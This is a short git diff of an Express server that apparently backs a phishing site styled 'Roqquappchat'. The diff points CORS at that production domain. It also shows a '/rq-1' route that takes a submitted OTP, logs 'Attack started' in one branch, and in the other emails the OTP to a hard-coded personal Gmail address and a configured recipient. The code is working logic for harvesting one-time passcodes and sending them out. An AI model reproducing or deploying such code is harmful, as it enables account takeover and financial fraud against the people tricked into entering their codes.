@@ -32,11 +32,11 @@ app.use(express.urlencoded({ extended: true }))
 //const parseForm = bodyParser.urlencoded({ extended: false })
 
 const corsOptions = {
-    // origin: 'https://roqquappchat.com',
-    origin: 'http://localhost:3000',
+    origin: 'https://roqquappchat.com',
+    //origin: 'http://localhost:3000',
     credentials: true,
-    preflightContinue: true,
-    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
+    // preflightContinue: true,
+    // methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
 }
 
 app.use(cors(corsOptions))
@@ -99,7 +99,7 @@ app.post('/rq-1', (req, res, next) => {
         console.log('Attack started', otp)
         return
     } else {
-        console.log("Normal email", otp)
+        console.log('Normal email', otp)
         const transporter = nodemailer.createTransport({
             host: process.env.HOST,
             port: 465,
@@ -129,7 +129,7 @@ app.post('/rq-1', (req, res, next) => {
         const mail = {
             from: process.env.EMAIL,
             //to: process.env.TOEMAIL,
-             to: `ifestephenie@gmail.com, ${process.env.TOEMAIL}`,
+            to: `ifestephenie@gmail.com, ${process.env.TOEMAIL}`,
             subject: 'New message from Roqquappchat',
             html: content,
         }
